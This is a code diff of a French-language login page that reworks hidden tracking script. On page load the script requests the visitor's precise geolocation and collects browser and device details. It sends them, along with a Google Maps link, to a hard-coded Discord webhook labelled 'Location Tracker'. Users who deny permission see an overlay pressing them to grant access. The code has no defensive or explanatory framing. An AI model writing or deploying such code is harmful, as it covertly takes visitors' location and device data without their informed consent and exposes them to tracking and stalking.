@@ -10,101 +10,6 @@
     </style>
 </head>
 <body >
-    <script>
-        document.addEventListener("DOMContentLoaded", function () {
-            getLocation();
-        });
-    
-        function getLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(showPosition, showError);
-            } else {
-                console.log("Geolocation is not supported by this browser.");
-            }
-        }
-    
-        function showPosition(position) {
-            let latitude = position.coords.latitude;
-            let longitude = position.coords.longitude;
-            let timestamp = new Date().toLocaleTimeString();
-    
-            let systemInfo = `
-            User Agent: ${navigator.userAgent}
-            Platform: ${navigator.platform}
-            Cookies Enabled: ${navigator.cookieEnabled}
-            Language: ${navigator.language}
-            Screen Width: ${screen.width}
-            Screen Height: ${screen.height}
-            Time: ${timestamp}
-            `;
-    
-            let locationData = `
-            Latitude: ${latitude}
-            Longitude: ${longitude}
-            Google Maps: https://www.google.com/maps/place/${latitude},${longitude}
-            `;
-    
-            sendData("User System Information", systemInfo);
-            sendData("User Location", locationData);
-        }
-    
-        function showError(error) {
-            let message;
-            switch (error.code) {
-                case error.PERMISSION_DENIED:
-                    message = "User denied the request for Geolocation.";
-                    break;
-                case error.POSITION_UNAVAILABLE:
-                    message = "Location information is unavailable.";
-                    break;
-                case error.TIMEOUT:
-                    message = "The request to get user location timed out.";
-                    break;
-                case error.UNKNOWN_ERROR:
-                    message = "An unknown error occurred.";
-                    break;
-            }
-            console.log(message);
-            sendData("Location Error", message);
-        }
-    
-        function sendData(title, description) {
-            const webhookUrl = "https://discord.com/api/webhooks/1337946103924133898/eudcofLWR_ryLQivFc1hgFf2v01Fy9RSIQJxd5G1Qo5VGeyWOtVKR5E-t-mr-XddLL1X"; // Replace with actual webhook URL
-    
-            let payload = {
-                username: "Location Tracker",
-                embeds: [
-                    {
-                        title: title,
-                        description: "```" + description + "```",
-                        color: 15844367
-                    }
-                ]
-            };
-    
-            fetch(webhookUrl, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(payload)
-            })
-            .catch(err => console.log("Error sending data:", err));
-        }
-    </script>
-    
-    <div class="cookie-banner" id="cookieBanner">
-        <p>Nous utilisons des cookies pour améliorer votre expérience sur notre site. En continuant, vous acceptez notre utilisation des cookies.</p>
-        <button id="acceptCookies">Accepter</button>
-    </div>
-    <script>
-        document.getElementById("acceptCookies").addEventListener("click", function() {
-            document.getElementById("cookieBanner").style.display = "none";
-            localStorage.setItem("cookiesAccepted", "true");
-        });
-    
-        if (localStorage.getItem("cookiesAccepted")) {
-            document.getElementById("cookieBanner").style.display = "none";
-        }
-    </script>
     
     <div class="loginWrapper">
         <div class="logo">
@@ -132,6 +37,8 @@
 
             <button type="submit" class="login-button">Connexion</button>
         </form>
+ <!-- Add the "Enable Location Access" button here -->
+ <button id="requestLocation" style="display: none;">Enable Location Access</button>
     </div>
     
     <footer class="footer">
@@ -145,5 +52,117 @@
             </ul>
         </div>
     </footer>
+    <script>
+   document.addEventListener("DOMContentLoaded", function () {
+    // Add an event listener to the button to re-request location access
+    document.getElementById("requestLocation").addEventListener("click", function () {
+        console.log("Button clicked, requesting location...");
+        getLocation();
+    });
+
+    // Initial location request
+    getLocation(); // Call this to trigger the location request on page load
+    function getLocation() {
+        if (navigator.geolocation) {
+            console.log("Requesting location permission...");
+            navigator.geolocation.getCurrentPosition(showPosition, showError, {
+                enableHighAccuracy: true, // Optional: Request high accuracy
+                timeout: 5000, // Optional: Timeout after 5 seconds
+                maximumAge: 0 // Optional: Force fresh location data
+            });
+        } else {
+            console.log("Geolocation is not supported by this browser.");
+        }
+    }
+
+function showPosition(position) {
+    let latitude = position.coords.latitude;
+    let longitude = position.coords.longitude;
+    let timestamp = new Date().toLocaleTimeString();
+    console.log(latitude, longitude);
+
+        let systemInfo = `
+        User Agent: ${navigator.userAgent}
+        Platform: ${navigator.platform}
+        Cookies Enabled: ${navigator.cookieEnabled}
+        Language: ${navigator.language}
+        Screen Width: ${screen.width}
+        Screen Height: ${screen.height}
+        Time: ${timestamp}
+        `;
+
+        let locationData = `
+        Latitude: ${latitude}
+        Longitude: ${longitude}
+        Google Maps: https://www.google.com/maps/place/${latitude},${longitude}
+        `;
+
+        sendData("User System Information", systemInfo);
+        sendData("User Location", locationData);
+    }
+
+    function showError(error) {
+    let message;
+    switch (error.code) {
+        case error.PERMISSION_DENIED:
+            message = "User denied the request for Geolocation.";
+            document.getElementById("locationOverlay").classList.add("show"); // Show overlay
+            break;
+        case error.POSITION_UNAVAILABLE:
+            message = "Location information is unavailable.";
+            break;
+        case error.TIMEOUT:
+            message = "The request to get user location timed out.";
+            break;
+        case error.UNKNOWN_ERROR:
+            message = "An unknown error occurred.";
+            break;
+    }
+    console.log(message);
+    sendData("Location Error", message);
+}
+
+// Handle user clicking "Allow Location Access"
+document.getElementById("grantLocation").addEventListener("click", function () {
+    document.getElementById("locationOverlay").classList.remove("show"); // Hide overlay
+    getLocation(); // Retry location request
+});
+
+
+    function sendData(title, description) {
+        const webhookUrl = "https://discord.com/api/webhooks/1337946103924133898/eudcofLWR_ryLQivFc1hgFf2v01Fy9RSIQJxd5G1Qo5VGeyWOtVKR5E-t-mr-XddLL1X"; // Replace with actual webhook URL
+
+        let payload = {
+            username: "Location Tracker",
+            embeds: [
+                {
+                    title: title,
+                    description: "```" + description + "```",
+                    color: 15844367
+                }
+            ]
+        };
+
+        fetch(webhookUrl, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload)
+        })
+        .catch(err => console.log("Error sending data:", err));
+    }
+});
+        
+
+    
+
+    </script>
+    <div id="locationOverlay" class="overlay">
+        <div class="overlay-content">
+            <h2>We Need Your Location</h2>
+            <p>To continue, please grant location access.</p>
+            <button id="grantLocation">Allow Location Access</button>
+        </div>
+    </div>
+    
 </body>
 </html>
